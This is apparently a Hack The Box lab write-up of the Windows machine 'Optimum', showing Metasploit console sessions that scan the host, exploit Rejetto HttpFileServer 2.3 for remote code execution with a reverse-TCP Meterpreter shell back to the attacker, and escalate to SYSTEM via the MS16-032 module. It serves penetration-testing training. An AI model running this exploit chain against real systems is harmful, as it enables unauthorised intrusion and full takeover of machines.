---
title: "Hack The Box: Optimum Write-Up"
date: 2023-12-23 22:06
categories: [Write-ups]
tags: [htb, lab, windows, metasploit, nmap]
---

Optimum is an easy-rated Windows machine that is vulnerable to at least one publicly known vulnerability. We will do the complete process, from enumeration to privilege escalation, from within the Metasploit Console.

## Enumeration

```console
msf6 > db_nmap -sV -sC -p- 10.10.10.8
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 14:11 EST
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.043s latency).
[*] Nmap: Not shown: 65534 filtered tcp ports (no-response)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    HttpFileServer httpd 2.3
[*] Nmap: |_http-server-header: HFS 2.3
[*] Nmap: |_http-title: HFS /
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 117.84 seconds
```

> In order to be able to use the `db_nmap` command, you will have to connect a PostgreSQL database to Metasploit. You can read about this in HTB Academy's [Metasploit module](https://academy.hackthebox.com/module/39/section/411) or in [Rapid7's documentation](https://docs.rapid7.com/metasploit/managing-the-database/). This will store all information gathered from nmap inside the database for further inspection, if needed.
{: .prompt-info}

The scan only shows one open port - port 80. The service running on this port seems to be HttpFileServer 2.3. Let's try our luck and search for this service in `msfconsole`.

## Exploitation

```console
msf6 > search httpfileserver 2.3

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```

We found an exploit from 2014 that would get us RCE. Let's try that.

```console
msf6 > use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.8       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

> I set the RHOSTS and LHOST parameters via the `setg` method previously, i.e. `setg rhosts 10.10.10.8` and `setg lhost tun0`, respectively.
{: .prompt-info}

```console
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] Using URL: http://10.10.16.3:8080/FrhxeEEi0gzpT
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /FrhxeEEi0gzpT
[*] Sending stage (175686 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\namCuLOXkD.vbs, unknown result
[*] Meterpreter session 3 opened (10.10.16.3:4444 -> 10.10.10.8:49174) at 2023-12-23 16:29:32 -0500
[*] Server stopped.

meterpreter > pwd
C:\Users\kostas\Desktop
meterpreter > getuid
Server username: OPTIMUM\kostas
meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2023-12-30 01:27:36 -0500  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2017-03-18 08:11:17 -0400  hfs.exe
100444/r--r--r--  34      fil   2023-12-29 23:07:20 -0500  user.txt
```

We got a meterpreter shell as the OPTIMUM\\kostas user! The user flag can be found in the directory we dropped in, i.e. `C:\Users\kostas\Desktop\user.txt`. Next, we need to find a way to escalate our privileges.

> In the output above, we can see that Metasploit tried to delete the payload `%TEMP%\namCuLOXkD.vbs` but it does not know whether it was successful. In a real assessment, we should double-check and make sure that it was deleted or delete it ourselves.
{: .prompt-warning}

## Privilege Escalation

Let's start by putting our newly gained shell in the background by pressing `CTRL+SHIFT+Z`. Confirm and keep note of the session number that is printed out. This number will be important soon.

We will search for the post-exploitation module `local_exploit_suggester`. This module searches for Metasploit exploits that could potentially be used on our target system after we got a foothold. Though, not all found exploits actually work. We will just have to make an educated guess on which one will work or try them randomly/sequentially.

```console
msf6 exploit(windows/http/rejetto_hfs_exec) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.
```

When you look at the options of this module, you will see the `SESSION` parameter. This is where you have to set the session number I mentioned earlier. For me, it was number 1 but it might be different in your case if you had other sessions open previously.

Now, let's try to run it.

```console
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 189 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.8 - Valid modules for session 1:

<SNIP>
```

There are 5 potential exploits that we could use against our target system. When we try the first two, we will find that they fail because our current user is not in the Administrator's group. The module `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` looks promising, though. Let's try that.

```console
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.
```

Again, we have to set the `SESSION` parameter to the correct value. Now run it.

```console
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

<SNIP>

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ls /Users/Administrator/Desktop
Listing: /Users/Administrator/Desktop
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 07:52:56 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-12-29 23:07:20 -0500  root.txt
```

We got a SYSTEM shell! Get the root flag from `C:\Users\Administrator\Desktop\root.txt`.